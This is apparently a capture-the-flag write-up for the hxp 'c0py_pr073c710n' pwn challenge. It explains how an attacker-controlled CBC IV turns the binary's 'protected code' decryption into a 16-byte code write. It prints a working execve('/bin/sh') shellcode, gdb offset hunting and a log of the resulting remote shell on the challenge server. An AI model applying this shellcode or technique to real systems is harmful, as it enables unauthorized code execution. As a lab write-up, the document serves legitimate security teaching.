## pwn / c0py_pr073c710n (200+11p, 26 solves)

>Software piracy is a crime!
>Don’t steal our hard work.
>
>nc 104.154.90.175 54509 
>[download](cat_flag.exe)
>
>HINT: 2.19-18+deb8u4

cat_flag.exe is x86-64 ELF binary with some code inside (marked as protected() routine) encrypted using AES-128-CBC. Mechanism is quite simple: binary asks for license key, then decrypts and executes protected() routine.

```c
int main()
{
  // ...
  char licenseKey[48]; // [sp+0h] [bp-60h]@  
  // ...
  
  printf("License Key: ", 0LL);
  strcpy(&licenseKey[17], 'guYoiGpBNgJT9Rb8');
  fgets(licenseKey, 33, stdin);
  ERR_load_crypto_strings(licenseKey, 33LL);
  OPENSSL_add_all_algorithms_noconf();
  OPENSSL_config(0LL);
  // {...}
  if ( mprotect(page_addr, page_size, 7) == -1 )
  {
    result = -1;
  }
  else
  {
    puts("Decrypting protected code...");
    // ... (evaluating encrypted code offset)
    decrypted_len = decrypt(&protected, protectedLen, licenseKey, &licenseKey[17], &protected);
    // ... (noping rest of payload)
    if ( mprotect(page_addr, page_size, 5) == -1 )
    {
      result = -1;
    }
    else
    {
      puts("Finished decryption!");
      puts("Starting protected code...");
      protected();
      puts("Bye!");
      result = 0;
    }
  }
  return result;
}
```

License key is 33-chars string, which is interpreted as 16-bytes AES key and 16-bytes IV with one not-important char in the middle. If we look [how CBC mode works](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_.28CBC.29), we can notice one interesting thing:

First decrypted block is just xor'ed with IV, which means that if we have control over IV, we can "decrypt" this block to everything we want. Just get some (random) key, "decrypt" ciphertext using it and xor the result with code you want to execute

Unfortunately, using this method, we can write only one block, which means that our shellcode can be only 16 bytes length. 
Binary hasn't any reference to system() inside, no code which could be helpful in spawning shell. It was difficult to place *"/bin/sh"* and *execve()* syscall in 16 bytes. Fortunately, libc contains string *"/bin/sh"* inside.

    (gdb) set environment LD_PRELOAD=libc2.19-18+deb8u4/libc-2.19.so libc2.19-18+deb8u4/ld-2.19.so
    ...
    (gdb) find &puts, -999999, "/bin/sh"
    0x7ffff7b8f6e8

I've also noticed that *puts()* leaves address in RCX register, which points to the part of *write()* routine from libc. 
With this address, we can easily evaluate *"/bin/sh"* position. Call to *puts()* can also be found just before *protected()* execution.

    (gdb) x/i $rip
    => 0x400c06 <main+33>:  callq  0x400900 <puts@plt>
    (gdb) x/d $rcx
    0x0:    Cannot access memory at address 0x0
    (gdb) ni
    Welcome to cat_flag.exe v0.3
    0x0000000000400c0b in main ()
    (gdb) x/d $rcx
    0x7ffff7b07e20 <write+16>:  -268354232

Finally, this 0xF-bytes shellcode was created:

    0:   31 f6                xor    esi,esi            /* argv NULL */
    2:   48 8d b9 b8 78 08 00 lea    rdi, [rcx+0x878b8] /* cmd "/bin/sh" */
    9:   b0 3b                mov    al,0x3b            /* execve */ 
    b:   31 d2                xor    edx,edx            /* env NULL */
    d:   0f 05                syscall                   /* FIRE! */

...and using this [exploit](exploit.py) we successfully got access to shell and were able to read the flag.

PS.: Shell had also small trap: some commands were modified and didn't produce any output (e.g. ls wasn't working)

    [+] Opening connection to 104.154.90.175 on port 54509: Done
    [*] Switching to interactive mode
    $ ls
    $ pwd
    /home/ctf
    $ find
    .
    ./ynetd
    ./.bashrc
    ./.bash_logout
    ./flag.txt
    ./cat_flag.exe
    ./.profile
    $ cat /home/ctf/flag.txt
    hxp{The unauthorized reproduction or distribution of this copyrighted work is illegal. Criminal copyright infringement, including infringement without monetary gain, is investigated by the FBI and is punishable by up to five years in federal prison and a fine of $250,000.}$  

